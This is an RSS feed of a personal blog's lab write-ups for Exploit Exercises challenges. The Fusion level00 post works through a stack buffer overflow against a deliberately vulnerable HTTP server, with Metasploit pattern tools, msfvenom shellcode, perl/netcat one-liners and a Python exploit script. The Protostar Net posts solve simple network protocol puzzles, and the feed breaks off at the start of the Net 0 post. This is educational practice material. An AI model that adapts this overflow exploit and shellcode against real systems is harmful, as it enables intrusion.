<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Exploit Exercises on Matt Andreko</title>
    <link>http://test.andreko.net/categories/exploit-exercises/index.xml</link>
    <description>Recent content in Exploit Exercises on Matt Andreko</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <atom:link href="http://test.andreko.net/categories/exploit-exercises/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Exploit Exercises - Fusion 00</title>
      <link>http://test.andreko.net/2012/04/09/exploit-exercises---fusion-00/</link>
      <pubDate>Mon, 09 Apr 2012 17:13:00 -0400</pubDate>
      
      <guid>http://test.andreko.net/2012/04/09/exploit-exercises---fusion-00/</guid>
      <description>&lt;p&gt;I was very excited to see the announcement on twitter, that &lt;a href=&#34;http://exploit-exercises.com/fusion&#34;&gt;Fusion&lt;/a&gt; was going to be released, even if it&amp;rsquo;s just the first 10 levels. I was a bit bummed, as I didn&amp;rsquo;t think I&amp;rsquo;d get to work on it much, until I complete &lt;a href=&#34;http://www.offensive-security.com/online-information-security-training/penetration-testing-backtrack/&#34;&gt;PWB&lt;/a&gt;, but I managed to find a little time to at least start it. I pulled up &lt;a href=&#34;http://exploit-exercises.com/fusion/level00&#34;&gt;level 00&lt;/a&gt;, which looks to be a basic stack overflow in an http server.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;The code for the server is below:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot; 

int fix_path(char *path)
{
 char resolved[128];

 if(realpath(path, resolved) == NULL) return 1; // can&#39;t access path. will error trying to open
 strcpy(path, resolved);
}

char *parse_http_request()
{
 char buffer[1024];
 char *path;
 char *q;

 printf(&amp;quot;[debug] buffer is at 0x%08x :-)\n&amp;quot;, buffer);

 if(read(0, buffer, sizeof(buffer)) &amp;lt;= 0) errx(0, &amp;quot;Failed to read from remote host&amp;quot;);
 if(memcmp(buffer, &amp;quot;GET &amp;quot;, 4) != 0) errx(0, &amp;quot;Not a GET request&amp;quot;);

 path = &amp;amp;buffer[4];
 q = strchr(path, &#39; &#39;);
 if(! q) errx(0, &amp;quot;No protocol version specified&amp;quot;);
 *q++ = 0;
 if(strncmp(q, &amp;quot;HTTP/1.1&amp;quot;, 8) != 0) errx(0, &amp;quot;Invalid protocol&amp;quot;);

 fix_path(path);

 printf(&amp;quot;trying to access %s\n&amp;quot;, path);

 return path;
}

int main(int argc, char **argv, char **envp)
{
 int fd;
 char *p;

 background_process(NAME, UID, GID); 
 fd = serve_forever(PORT);
 set_io(fd);

 parse_http_request(); 
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I initially had to read through the code a few times to figure out where the overflow was, to be quite honest. When an HTTP request comes in, it goes to the &amp;ldquo;parse_http_request&amp;rdquo; method. From there, it reads the buffr in by using the &amp;ldquo;read&amp;rdquo; method. Unfortunately for us, it is being careful to only read in as many bytes as it can put into the buffer.  It then does some basic handling to parse out the request.  It verifies that it was a &amp;ldquo;GET&amp;rdquo; request, and that it was done using HTTP/1.1. After that, it will pass the path of the URI to &amp;ldquo;fix_path&amp;rdquo;. In this method, there &lt;i&gt;IS&lt;/i&gt; an overflow, since the &amp;ldquo;resolved&amp;rdquo; variable has 128 bytes to hold data, but there is no checking of size when the &amp;ldquo;strcpy&amp;rdquo; is done.&lt;/p&gt;

&lt;p&gt;I logged into the machine, and made sure that I could actually get a core dump to be created if the process had an exception.  To do this, I changed the core settings for my user:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ ulimit -c unlimited
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Based on my analysis, I knew I would be overflowing the URI path, but based on the note given to me, I would put my shellcode after the &amp;ldquo;HTTP/1.1&amp;rdquo; since there was a lot more room.  However, I didn&amp;rsquo;t know the EIP offset. So I generated a quick MSF pattern on another machine:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_create.rb 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then started to wire up an exploit like so:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&amp;quot; . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\xcc&amp;quot;x100&#39; | nc localhost 20000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Note that the &amp;ldquo;\x99\xf9\xff\xbf&amp;rdquo; value was simply guessed by taking the buffer offset (conveniently given to us at runtime) of &amp;ldquo;0xbffff8f8&amp;rdquo;, and adding to it enough bytes for the &amp;ldquo;GET&amp;rdquo;, the MSF buffer, and the &amp;ldquo;HTTP/1.1&amp;rdquo;. I had played previously by hand, and knew how long the buffer would be, so I didn&amp;rsquo;t need to break this into 2 steps.&lt;/p&gt;

&lt;p&gt;After executing the command, I found a handy &amp;ldquo;core&amp;rdquo; file in the root directory. So I loaded it up in GDB to get the offset:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ sudo gdb --core=/core --quiet
[New LWP 2280]
Core was generated by `/opt/fusion/bin/level00&#39;.
Program terminated with signal 11, Segmentation fault.
#0  0x65413665 in ?? ()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, I took that EIP value, and ran it through the MSF Pattern Offset calculator:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:/opt/framework-4.0.0/msf3/tools$ ./pattern_offset.rb 0x65413665
139
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was convenient enough to let me know that the first 139 bytes were junk, but then I had direct access to the EIP. If my estimate for a return address was close enough to hit a nop sled, it would then hit the &amp;ldquo;\xcc&amp;rdquo; debug/trace point. I then tested that:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;A&amp;quot;x139 . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\xcc&amp;quot;x100&#39; | nc localhost 20000
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I loaded the new core file into GDB, I saw that it indeed hit the debug trap:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ sudo gdb --core=/core --quiet
[New LWP 2310]
Core was generated by `/opt/fusion/bin/level00&#39;.
Program terminated with signal 5, Trace/breakpoint trap.
#0  0xbffff9fb in ?? ()
(gdb) x/10x $eip
0xbffff9fb:     0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc
0xbffffa03:     0xcc    0xcc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The next step was to generate some shellcode.   verified that the process was running as a UID of 20000, and not SUID, so I&amp;rsquo;m guessing at the end result here. The challenge to me was actually getting the exploit to work, so what the shellcode did was not a big event for me.  I decided to just make it write a file to /tmp. This could however be adapted to anything else.&lt;/p&gt;

&lt;p&gt;I used Metasploit&amp;rsquo;s MSFVenom tool to generate me some shellcode to &amp;ldquo;touch /tmp/poo&amp;rdquo; as a test:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mandreko@li225-134:~$ msfvenom -p linux/x86/exec -f pl CMD=&amp;quot;touch /tmp/poo&amp;quot;
my $buf =
&amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73&amp;quot; .
&amp;quot;\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00&amp;quot; .
&amp;quot;\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f&amp;quot; .
&amp;quot;\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I then plugged that shellcode into my exploit:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ perl -e &#39;print &amp;quot;GET /&amp;quot;. &amp;quot;A&amp;quot;x139 . &amp;quot;\x99\xf9\xff\xbf&amp;quot; . &amp;quot; HTTP/1.1\n&amp;quot; . &amp;quot;\x90&amp;quot;x100 . &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;&#39; | nc localhost 20000
[debug] buffer is at 0xbffff8f8 :-)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly, I verified that it did run the shellcode:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;fusion@fusion:/$ ls -al /tmp
total 8
drwxrwxrwt  2 root  root  4096 2012-04-09 21:25 .
drwxr-xr-x 22 root  root  4096 2012-04-09 21:22 ..
-rw-r--r--  1 20000 20000    0 2012-04-09 21:25 poo
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There you have it, successful exploitation, using very basic methods. This one felt very much like the first day back from summer break, but I&amp;rsquo;m guessing it&amp;rsquo;ll get much harder quickly.&lt;/p&gt;

&lt;p&gt;UPDATE 5/7/2012: Added python exploit:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# Fusion Level 00
# http://exploit-exercises.com/fusion/level00
# Matt Andreko
# twitter: @mandreko
# contact: matt [at] mattandreko.com

from sys import exit
from struct import pack
from optparse import OptionParser
from socket import *

def exploit(hostname, port):
        junk = &amp;quot;A&amp;quot;*139
        ret = pack(&amp;quot;&amp;lt;I&amp;quot;, 0xbffff999)
        nops = &amp;quot;\x90&amp;quot;*100
        shellcode = &amp;quot;\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x0f\x00\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x70\x6f\x6f\x00\x57\x53\x89\xe1\xcd\x80&amp;quot;

        s = socket(AF_INET, SOCK_STREAM)
        try:
                print &amp;quot;[*] Connecting to %s on port %s&amp;quot; % (hostname, port)
                s.connect((hostname, port))
        except:
                print &amp;quot;[*] Connection error&amp;quot;
                exit(1)

        print s.recv(1024)
        s.send(&amp;quot;GET /&amp;quot; + junk + ret + &amp;quot; HTTP/1.1\n&amp;quot; + nops + shellcode)


if __name__ == &amp;quot;__main__&amp;quot;:
    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20000,
     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)

    (options, args) = parser.parse_args()

    exploit(options.hostname, options.portnum)
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Net 3</title>
      <link>http://test.andreko.net/2012/02/11/exploit-exercises---protostar-net-3/</link>
      <pubDate>Sat, 11 Feb 2012 10:11:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/02/11/exploit-exercises---protostar-net-3/</guid>
      <description>&lt;p&gt;The last in the Net series of &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;Protostar&lt;/a&gt; is &lt;a href=&#34;http://exploit-exercises.com/protostar/net3&#34;&gt;Net 3&lt;/a&gt;.  It was of course the most difficult of all of them.  However, it still wasn&amp;rsquo;t too bad.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;First, we&amp;rsquo;re given the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;

#define NAME &amp;quot;net3&amp;quot;
#define UID 996
#define GID 996
#define PORT 2996

/*
 * Extract a null terminated string from the buffer 
 */

int get_string(char **result, unsigned char *buffer, u_int16_t len)
{
 unsigned char byte;

 byte = *buffer;

 if(byte &amp;gt; len) errx(1, &amp;quot;badly formed packet&amp;quot;);
 *result = malloc(byte);
 strcpy(*result, buffer + 1);

 return byte + 1;
}

/*
 * Check to see if we can log into the host
 */

int login(unsigned char *buffer, u_int16_t len)
{
 char *resource, *username, *password;
 int deduct;
 int success;

 if(len &amp;lt; 3) errx(1, &amp;quot;invalid login packet length&amp;quot;);

 resource = username = password = NULL;

 deduct = get_string(&amp;amp;resource, buffer, len);
 deduct += get_string(&amp;amp;username, buffer+deduct, len-deduct);
 deduct += get_string(&amp;amp;password, buffer+deduct, len-deduct);

 success = 0;
 success |= strcmp(resource, &amp;quot;net3&amp;quot;);
 success |= strcmp(username, &amp;quot;awesomesauce&amp;quot;);
 success |= strcmp(password, &amp;quot;password&amp;quot;);

 free(resource);
 free(username);
 free(password);

 return ! success;
}

void send_string(int fd, unsigned char byte, char *string)
{
 struct iovec v[3];
 u_int16_t len;
 int expected;

 len = ntohs(1 + strlen(string));

 v[0].iov_base = &amp;amp;len;
 v[0].iov_len = sizeof(len);

 v[1].iov_base = &amp;amp;byte;
 v[1].iov_len = 1;

 v[2].iov_base = string;
 v[2].iov_len = strlen(string);

 expected = sizeof(len) + 1 + strlen(string);

 if(writev(fd, v, 3) != expected) errx(1, &amp;quot;failed to write correct amount of bytes&amp;quot;);

}

void run(int fd)
{
 u_int16_t len;
 unsigned char *buffer;
 int loggedin;

 while(1) {
  nread(fd, &amp;amp;len, sizeof(len));
  len = ntohs(len);
  buffer = malloc(len);

  if(! buffer) errx(1, &amp;quot;malloc failure for %d bytes&amp;quot;, len);

  nread(fd, buffer, len);

  switch(buffer[0]) {
   case 23: 
    loggedin = login(buffer + 1, len - 1);
    send_string(fd, 33, loggedin ? &amp;quot;successful&amp;quot; : &amp;quot;failed&amp;quot;);
    break;

   default:
    send_string(fd, 58, &amp;quot;what you talkin about willis?&amp;quot;);
    break;
  }
 }
}

int main(int argc, char **argv, char **envp)
{
 int fd;
 char *username;

 /* Run the process as a daemon */
 background_process(NAME, UID, GID); 

 /* Wait for socket activity and return */
 fd = serve_forever(PORT);

 /* Set the client socket to STDIN, STDOUT, and STDERR */
 set_io(fd);

 /* Don&#39;t do this :&amp;gt; */
 srandom(time(NULL));

 run(fd);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now because my C is a bit rusty, and I didn&amp;rsquo;t always understand what was going on well, I re-wrote some of it to look like this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdio.h&amp;gt;

int get_string(char **result, unsigned char *buffer, u_int16_t len)
{
        unsigned char byte;

        byte = *buffer;

        printf(&amp;quot;[*] Byte as hex: %x\n&amp;quot;, byte);

        if(byte &amp;gt; len)
        {
                printf(&amp;quot;[*] Culprit: %s. %x is greater than %x\n&amp;quot;, &amp;amp;buffer, byte, len);
                errx(1, &amp;quot;badly formed packet&amp;quot;);
        }
        *result = malloc(byte);
        strcpy(*result, buffer + 1);

        printf(&amp;quot;[*] Returning: %i\n&amp;quot;, byte+1);
        return byte + 1;
}

int login(unsigned char *buffer, u_int16_t len)
{
        char *resource, *username, *password;
        int deduct;
        int success;

        if(len &amp;lt; 3) errx(1, &amp;quot;invalid login packet length&amp;quot;);

        resource = username = password = NULL;

        deduct = get_string(&amp;amp;resource, buffer, len);
        deduct += get_string(&amp;amp;username, buffer+deduct, len-deduct);
        deduct += get_string(&amp;amp;password, buffer+deduct, len-deduct);

        printf(&amp;quot;Resource: %s\n&amp;quot;, resource);
        printf(&amp;quot;Username: %s\n&amp;quot;, username);
        printf(&amp;quot;Password: %s\n&amp;quot;, password);

        success = 0;
        success |= strcmp(resource, &amp;quot;net3&amp;quot;);
        printf(&amp;quot;[*] Success (iteration 1): %x\n&amp;quot;, success);

        success |= strcmp(username, &amp;quot;awesomesauce&amp;quot;);
        printf(&amp;quot;[*] Success (iteration 2): %x\n&amp;quot;, success);

        success |= strcmp(password, &amp;quot;password&amp;quot;);
        printf(&amp;quot;[*] Success (iteration 3): %x\n&amp;quot;, success);


        free(resource);
        free(username);
        free(password);

        return ! success;
}

void main(int argc, char **argv)
{
        unsigned char *buffer;
        u_int16_t len;
        int loggedin;

        buffer = &amp;quot;string values go here yo&amp;quot;;

        len = strlen(buffer);

        loggedin = login(buffer, len);
        printf(&amp;quot;[*] Logged in: %x\n&amp;quot;, loggedin);

}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This allowed me to get a LOT more debug information, and not worry about my python program failing somewhere.&lt;/p&gt;

&lt;p&gt;In my analysis, I found this program to be the most complicated (of course).  It has a daemon running on port 2996.  It needs a login string to be sent to it just perfectly.  That login string needs to have the first byte be in little-endian format, the length of the login string.  Then each of the 3 strings, the resource, username, and password, must be sent with their length in little-endian prepended to them, and a null string terminator appended. However, before any of that login string is sent, it needs a control character of &amp;ldquo;\x17&amp;rdquo; (23) to go into the login logic.&lt;/p&gt;

&lt;p&gt;Eventually, I ended up with the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python

# Protostar Net 3
# http://exploit-exercises.com/protostar/net3
# Matt Andreko
# twitter: @mandreko
# contact: matt [at] mattandreko.com

from socket import *
from struct import *
from optparse import OptionParser
import select

def main(host, port):

 s = socket(AF_INET, SOCK_STREAM)
 s.connect((host, port))
 
 login_string = (&amp;quot;\x17&amp;quot; # \x17 = 23, which lets us by the switch statement.
                        # It appears to be a control character
     &amp;quot;\x05net3\x00&amp;quot; # Send the resource name, prepended with 
                    #it&#39;s length in hex, and appended with a null
                    # byte
     &amp;quot;\x0dawesomesauce\x00&amp;quot; # Send the user name, prepended with
                            # it&#39;s length in hex, and appended
                            # with a null byte
     &amp;quot;\x0apassword\x00&amp;quot;) # Send the password, prepended with
                         # it&#39;s length in hex, and appended 
                         # with a null byte

 login_length = len(login_string) # The initial byte needs to be the length
                                  # of the entire login string, so that it
                                  # knows how much memory to malloc()

 s.send(pack(&amp;quot;&amp;gt;H&amp;quot;, login_length))
 
 s.send(login_string)
 
 print s.recv(1024)
 
 s.close()

if __name__ == &amp;quot;__main__&amp;quot;:
    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, 
     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2996, 
     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)

    (options, args) = parser.parse_args()
    
    main(options.hostname, options.portnum)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I run that code, I get:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;C:\Protostar&amp;gt;net3.py -H 192.168.1.132
 ♂!successful
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;That is the last of all the Net challenges that I see documented.  But I do wonder, since in the virtual machine, there is a net4 binary. :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Net 2</title>
      <link>http://test.andreko.net/2012/02/10/exploit-exercises---protostar-net-2/</link>
      <pubDate>Fri, 10 Feb 2012 05:19:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/02/10/exploit-exercises---protostar-net-2/</guid>
      <description>&lt;p&gt;So far, these Net challenges in &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;Protostar&lt;/a&gt; have been pretty easy.  This challenge, &lt;a href=&#34;http://exploit-exercises.com/protostar/net2&#34;&gt;Net 2&lt;/a&gt; got a small bit tougher.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We are given the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;

#define NAME &amp;quot;net2&amp;quot;
#define UID 997
#define GID 997
#define PORT 2997

void run()
{
 unsigned int quad[4];
 int i;
 unsigned int result, wanted;

 result = 0;
 for(i = 0; i &amp;lt; 4; i++) {
  quad[i] = random();
  result += quad[i];

  if(write(0, &amp;amp;(quad[i]), sizeof(result)) != sizeof(result)) { 
   errx(1, &amp;quot;:(\n&amp;quot;);
  }
 }

 if(read(0, &amp;amp;wanted, sizeof(result)) != sizeof(result)) {
  errx(1, &amp;quot;:&amp;lt;\n&amp;quot;);
 }


 if(result == wanted) {
  printf(&amp;quot;you added them correctly\n&amp;quot;);
 } else {
  printf(&amp;quot;sorry, try again. invalid\n&amp;quot;);
 }
}

int main(int argc, char **argv, char **envp)
{
 int fd;
 char *username;

 /* Run the process as a daemon */
 background_process(NAME, UID, GID); 

 /* Wait for socket activity and return */
 fd = serve_forever(PORT);

 /* Set the client socket to STDIN, STDOUT, and STDERR */
 set_io(fd);

 /* Don&#39;t do this :&amp;gt; */
 srandom(time(NULL));

 run();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;From this code, we can see a daemon is listening on port 2997.  It is going to output 4 random unsigned integers in little-endian format.  It then will expect the sum of all 4 of those integers to be returned in little-endian format.&lt;/p&gt;

&lt;p&gt;I was able to solve this with the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python

# Protostar Net 2
# http://exploit-exercises.com/protostar/net2
# Matt Andreko
# twitter: @mandreko
# contact: matt [at] mattandreko.com

from socket import *
from struct import *
from optparse import OptionParser

def main(host, port):

 s = socket(AF_INET, SOCK_STREAM)
 s.connect((host, port))

 sum = 0

 # Loop over the 4 unsigned integers being read in, and them to &amp;quot;sum&amp;quot;
 for x in range(4):
  data = s.recv(4)
  little_endian = int(unpack(&amp;quot;&amp;lt;I&amp;quot;, data)[0])
  print &amp;quot;[*] integer &amp;quot; + str(x) + &amp;quot;: &amp;quot; + str(little_endian)
  sum += little_endian

 print &amp;quot;[*] Sum: &amp;quot; + str(sum)

 # Handle integer overflow by doing a logical AND with 0xffffffff
 sum &amp;amp;= 0xffffffff

 # Convert the sum back to little-endian, to send back over the wire
 sum_packed = pack(&amp;quot;&amp;lt;I&amp;quot;, sum)

 s.send(sum_packed)
 print s.recv(1024)

 s.close()

if __name__ == &amp;quot;__main__&amp;quot;:
    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, 
     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2997, 
     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)

    (options, args) = parser.parse_args()
    
    main(options.hostname, options.portnum)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;When I run that code, I get the following output: &lt;pre class=&#34;brush: plain&#34;&gt;
C:\Protostar&amp;gt;net2.py -H 192.168.1.132
[&lt;em&gt;] integer 0: 1724850170
[&lt;/em&gt;] integer 1: 692469090
[&lt;em&gt;] integer 2: 630776982
[&lt;/em&gt;] integer 3: 1691529294
[*] Sum: 4739625536
you added them correctly
```&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Net 1</title>
      <link>http://test.andreko.net/2012/02/09/exploit-exercises---protostar-net-1/</link>
      <pubDate>Thu, 09 Feb 2012 05:43:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/02/09/exploit-exercises---protostar-net-1/</guid>
      <description>&lt;p&gt;Continuing with the &amp;ldquo;Net&amp;rdquo; series of &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;Protostar&lt;/a&gt;, is Net 1.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;We are given the following code:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;quot;../common/common.c&amp;quot;

#define NAME &amp;quot;net1&amp;quot;
#define UID 998
#define GID 998
#define PORT 2998

void run()
{
 char buf[12];
 char fub[12];
 char *q;

 unsigned int wanted;

 wanted = random();

 sprintf(fub, &amp;quot;%d&amp;quot;, wanted);

 if(write(0, &amp;amp;wanted, sizeof(wanted)) != sizeof(wanted)) { 
  errx(1, &amp;quot;:(\n&amp;quot;);
 }

 if(fgets(buf, sizeof(buf)-1, stdin) == NULL) {
  errx(1, &amp;quot;:(\n&amp;quot;);
 }

 q = strchr(buf, &#39;\r&#39;); if(q) *q = 0;
 q = strchr(buf, &#39;\n&#39;); if(q) *q = 0;

 if(strcmp(fub, buf) == 0) {
  printf(&amp;quot;you correctly sent the data\n&amp;quot;);
 } else {
  printf(&amp;quot;you didn&#39;t send the data properly\n&amp;quot;);
 }
}

int main(int argc, char **argv, char **envp)
{
 int fd;
 char *username;

 /* Run the process as a daemon */
 background_process(NAME, UID, GID); 

 /* Wait for socket activity and return */
 fd = serve_forever(PORT);

 /* Set the client socket to STDIN, STDOUT, and STDERR */
 set_io(fd);

 /* Don&#39;t do this :&amp;gt; */
 srandom(time(NULL));

 run();
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Similar to Net 0, it looks like this is another network daemon, this time running on port 2998.  It creates a random number (&amp;ldquo;wanted&amp;rdquo;).  It then outputs that in little-endian format, which it then expects to be returned to it in an ASCII string.&lt;/p&gt;

&lt;p&gt;I wrote up the following code to do exactly that:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python

# Protostar Net 1
# http://exploit-exercises.com/protostar/net1
# Matt Andreko
# twitter: @mandreko
# contact: matt [at] mattandreko.com

from socket import *
from struct import *
from optparse import OptionParser

def main(host, port):

    s = socket(AF_INET, SOCK_STREAM)
    s.connect((host, port))

    # Read in the data
    data = s.recv(1024)
    print &amp;quot;[*] Data: &amp;quot; + data

    # Convert it from little-endian to an unsigned integer
    num = unpack(&amp;quot;&amp;lt;I&amp;quot;, data)[0]
    print &amp;quot;[*] Unpacked: &amp;quot; + str(num)

    #Send the ASCII representation back
    s.send(str(num))

    # Read response from server
    print s.recv(1024)
    s.close()

if __name__ == &amp;quot;__main__&amp;quot;:
    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;, 
        type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=2998, 
        type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)

    (options, args) = parser.parse_args()
    
    main(options.hostname, options.portnum)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The output from the program looks like:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;
C:\Protostar&amp;gt;net1.py -H 192.168.1.132
[*] Data: H&amp;lt;Çy
[*] Unpacked: 2038447176
you correctly sent the data
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Exploit Exercises - Protostar Net 0</title>
      <link>http://test.andreko.net/2012/02/08/exploit-exercises---protostar-net-0/</link>
      <pubDate>Wed, 08 Feb 2012 18:31:00 -0500</pubDate>
      
      <guid>http://test.andreko.net/2012/02/08/exploit-exercises---protostar-net-0/</guid>
      <description>&lt;p&gt;I recently started looking at the &amp;ldquo;Net&amp;rdquo; problems in &lt;a href=&#34;http://exploit-exercises.com/protostar&#34;&gt;Protostar&lt;/a&gt;, and found them to be quite a fun change in pace.&lt;/p&gt;

&lt;!-- more --&gt;

&lt;p&gt;Starting with &lt;a href=&#34;http://exploit-exercises.com/protostar/net0&#34;&gt;Net 0&lt;/a&gt;, we are given the following code:&lt;/p&gt;

